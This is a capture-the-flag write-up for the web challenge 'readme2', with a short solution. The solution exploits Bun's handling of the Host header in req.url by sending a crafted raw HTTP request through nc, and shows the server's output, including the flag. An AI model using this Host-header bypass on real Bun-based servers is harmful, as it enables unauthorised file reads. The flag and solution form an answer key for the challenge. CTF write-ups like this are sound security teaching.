# readme2
**Category:** Web
**Difficulty:** Medium
**Author:** maple3142

## Description

Try to read the `flag.txt` file, again!

## Distribution

- `readme2.tar.gz`  (remove flag from Dockerfile then `tar czf readme.tar.gz app.js Dockerfile`)
- url

## Solution

Bun will put the value of `Host` header into `req.url`, which allows us to do many funny things to bypass the check.

```bash
> printf 'GET /.. HTTP/1.0\r\nHost: fakehost/fla\tg.txt\r\n\r\n' | nc readme2.chal.imaginaryctf.org 80
HTTP/1.1 200 OK
Content-Type: text/plain;charset=utf-8
Date: Sun, 21 Jul 2024 08:37:29 GMT
Date: Sun, 21 Jul 2024 08:37:29 GMT
Content-Length: 43

ictf{just_a_funny_bug_in_bun_http_handling}
```
